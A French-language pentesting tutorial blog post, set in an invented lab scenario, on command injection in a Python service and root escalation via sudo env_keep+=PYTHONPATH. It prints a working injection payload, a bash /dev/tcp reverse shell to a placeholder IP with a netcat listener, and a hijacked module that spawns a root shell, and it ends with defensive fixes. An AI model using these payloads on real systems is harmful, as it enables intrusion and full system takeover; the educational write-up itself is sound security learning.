Injection de commande et élévation de privilèges via PYTHONPATH

Par Jonas Sleiman 18 octobre 2026 Tutoriel

Pendant mon entraînement, j'ai rencontré un enchaînement de deux failles que l'on retrouve très souvent en test d'intrusion : d'abord une injection de commande pour obtenir un premier accès, puis une élévation de privilèges qui exploite une mauvaise configuration de sudo. Plutôt que de raconter une machine précise, j'ai recréé la situation avec un exemple inventé, pour expliquer le mécanisme. Tout ce qui suit doit rester cantonné à vos propres machines ou à des plateformes d'entraînement qui l'autorisent.

1. L'injection de commande

Une injection de commande se produit quand un programme passe une donnée fournie par l'utilisateur directement au système, sans la contrôler. Imaginons un petit service écrit en Python qui enregistre un signalement :

import os

def signalement():
    nom = input("votre nom :\n")
    os.system("bash -c 'echo %s > /tmp/rapport.txt'" % nom)

Le problème est à la dernière ligne. Le texte tapé par l'utilisateur est inséré tel quel dans une commande bash. Tant qu'on écrit un nom normal, tout va bien. Mais le shell interprète certains caractères, en particulier le point-virgule, qui sépare deux commandes.

Si, à la place de mon nom, j'écris :

jonas; id

le programme exécute en réalité deux commandes à la suite : le echo prévu, puis la commande id que j'ai glissée. Le service fait donc quelque chose que son auteur n'avait jamais prévu. C'est tout le principe de l'injection : détourner une entrée de texte pour faire exécuter ses propres commandes.

Du simple test au reverse shell

Exécuter id prouve la faille, mais pour vraiment prendre la main, on demande à la machine de nous rappeler : c'est un reverse shell. Sur ma machine d'attaque, je me mets d'abord à l'écoute :

nc -lvnp 4444

Puis j'injecte une commande qui ouvre une connexion de la cible vers moi :

jonas; bash -i >& /dev/tcp/MON_IP/4444 0>&1

La cible se connecte alors à mon écoute et me donne un shell. J'ai mon premier accès, avec les droits de l'utilisateur qui faisait tourner le service, souvent un compte peu privilégié.

Un détail vécu : ce premier shell est « sommaire ». Il affichait mes commandes en double et certaines sorties n'apparaissaient pas, à cause de l'absence de vrai terminal. On peut le rendre plus confortable :

python3 -c 'import pty; pty.spawn("/bin/bash")'

C'est une étape que je retiens : un shell instable n'est pas un échec, il se stabilise.

2. L'élévation de privilèges via sudo et PYTHONPATH

Avoir un accès, c'est bien ; devenir root, c'est l'objectif. Le premier réflexe est de regarder ce que l'utilisateur a le droit de lancer en tant que root :

sudo -l

Dans mon exemple, la réponse ressemble à ceci :

env_keep+=PYTHONPATH
(root) NOPASSWD: /usr/bin/python3 /opt/appli/outil.py

Deux informations très importantes se cachent là :

  • NOPASSWD : je peux lancer ce script Python en tant que root, sans mot de passe.
  • env_keep+=PYTHONPATH : quand je lance cette commande avec sudo, la variable d'environnement PYTHONPATH est conservée. Normalement, sudo nettoie l'environnement pour des raisons de sécurité ; ici, une exception a été laissée.

Pourquoi PYTHONPATH est dangereux ici

PYTHONPATH indique à Python où chercher les modules à importer. Regardons le script autorisé :

from outils import verif
print(verif.comparer("a", "a"))

Quand Python lit from outils import ..., il cherche un fichier outils.py dans la liste de ses dossiers. Et cette liste commence par les dossiers de PYTHONPATH. Puisque sudo garde ma variable PYTHONPATH, je peux lui faire chercher le module dans un dossier que je contrôle, par exemple /tmp.

Je crée donc un faux module outils.py dans /tmp. Au lieu de comparer quoi que ce soit, il exécute mon code au moment de l'import :

import os
os.system("/bin/bash")

Puis je lance la commande autorisée en pointant PYTHONPATH vers mon dossier :

sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/appli/outil.py

Python, lancé en tant que root, va chercher outils, trouve mon fichier dans /tmp en premier, et exécute mon os.system("/bin/bash"). Résultat : un shell root. La machine est entièrement compromise.

Ce que j'en retiens

  • Une injection de commande vient presque toujours d'une donnée utilisateur passée au système sans contrôle.
  • sudo -l est un des tout premiers réflexes après un accès : il révèle souvent le chemin vers root.
  • Garder une variable comme PYTHONPATH dans env_keep casse la protection de sudo et permet de détourner l'import d'un module.
  • Un shell bancal se stabilise, ce n'est pas un échec.

Comment s'en protéger

Côté défense, les corrections sont nettes :

  • Ne jamais construire une commande système par concaténation de texte. En Python, utiliser subprocess.run([...]) avec une liste d'arguments, qui n'interprète pas les caractères spéciaux du shell.
  • Valider et filtrer toute entrée utilisateur.
  • Limiter au strict minimum les règles sudo, et ne jamais ajouter de variable sensible comme PYTHONPATH à env_keep.

Comprendre une attaque, c'est aussi savoir la corriger : c'est exactement le travail d'un pentester. C'est mon premier article ; d'autres suivront au fil de ma progression.
